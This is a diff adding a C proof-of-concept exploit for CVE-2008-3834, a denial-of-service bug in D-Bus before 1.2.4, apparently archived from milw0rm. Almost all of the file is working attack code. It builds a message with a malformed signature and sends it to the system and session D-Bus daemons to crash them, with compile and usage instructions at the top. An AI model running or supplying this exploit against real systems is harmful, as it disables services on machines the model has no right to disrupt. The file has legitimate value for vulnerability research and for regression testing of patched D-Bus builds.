@@ -1,0 +1,110 @@
+/*
+ * cve-2008-3834.c
+ *
+ * D-Bus Daemon Denial of Service < 1.2.4
+ * Jon Oberheide <jon@oberheide.org>
+ * http://jon.oberheide.org
+ *
+ * Usage:
+ *
+ *   $ gcc `pkg-config dbus-1 --cflags` cve-2008-3834.c `pkg-config dbus-1 --libs` -o cve-2008-3834
+ *   $ ./cve-2008-3834
+ *  
+ * Information:
+ *
+ *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3834
+ *
+ *   The dbus_signature_validate function in the D-bus library (libdbus) 
+ *   before 1.2.4 allows remote attackers to cause a denial of service 
+ *   (application abort) via a message containing a malformed signature,
+ *   which triggers a failed assertion error. 
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <string.h>
+
+#include <dbus/dbus.h>
+
+#define DEST "org.freedesktop.ExampleService"
+#define NAME "org.freedesktop.ExampleInterface.ExampleMethod"
+#define PATH "/org/freedesktop/sample/object/name"
+#define SIGNAL "ExampleMethod"
+
+int
+main(int argc, char *argv[])
+{
+	char sig[8];
+	uint32_t val = 0xdeadbeef;
+	DBusMessage *message;
+	DBusConnection *system, *session;
+	DBusMessageIter iter1, iter2, iter3, iter4;
+
+	printf("[+] creating malicious dbus message...\n");
+
+	message = dbus_message_new_signal(PATH, NAME, SIGNAL);
+	if (!message) {
+		printf("[-] error: could not create dbus message\n");
+		return 1;
+	}
+	if (!dbus_message_set_destination(message, DEST)) {
+		printf("[-] error: could not create set dbus destination\n");
+		return 1;
+	}
+
+	sig[0] = DBUS_DICT_ENTRY_BEGIN_CHAR;
+	sig[1] = DBUS_STRUCT_BEGIN_CHAR;
+	sig[2] = DBUS_TYPE_INT32;
+	sig[3] = DBUS_TYPE_INT32;
+	sig[4] = DBUS_STRUCT_END_CHAR;
+	sig[5] = DBUS_TYPE_INT32;
+	sig[6] = DBUS_DICT_ENTRY_END_CHAR;
+	sig[7] = '\0';
+
+	dbus_message_iter_init_append(message, &iter1);
+	dbus_message_iter_open_container(&iter1, DBUS_TYPE_ARRAY, sig, &iter2);
+	dbus_message_iter_open_container(&iter2, DBUS_TYPE_DICT_ENTRY, NULL, &iter3);
+	dbus_message_iter_open_container(&iter3, DBUS_TYPE_STRUCT, NULL, &iter4);
+	dbus_message_iter_append_basic(&iter4, DBUS_TYPE_INT32, &val);
+	dbus_message_iter_append_basic(&iter4, DBUS_TYPE_INT32, &val);
+	dbus_message_iter_close_container(&iter3, &iter4);
+	dbus_message_iter_append_basic(&iter3, DBUS_TYPE_INT32, &val);
+	dbus_message_iter_close_container(&iter2, &iter3);
+	dbus_message_iter_close_container(&iter1, &iter2);
+
+	printf("[+] connecting to dbus system daemon...\n");
+
+	system = dbus_bus_get(DBUS_BUS_SYSTEM, NULL);
+
+	if (system) {
+		printf("[+] killing dbus system daemon...\n");
+
+		dbus_connection_send(system, message, NULL);
+		dbus_connection_flush(system);
+		dbus_connection_unref(system);
+	} else {
+		printf("[-] error: could not connect to dbus system daemon\n");
+	}
+
+	printf("[+] connecting to dbus session daemon...\n");
+
+	session = dbus_bus_get(DBUS_BUS_SESSION, NULL);
+
+	if (session) {
+		printf("[+] killing dbus session daemon...\n");
+
+		dbus_connection_send(session, message, NULL);
+		dbus_connection_flush(session);
+		dbus_connection_unref(session);
+	} else {
+		printf("[-] error: could not connect to dbus session daemon\n");
+	}
+
+	dbus_message_unref(message);
+
+	return 0;
+}
+
+// milw0rm.com [2009-01-19]
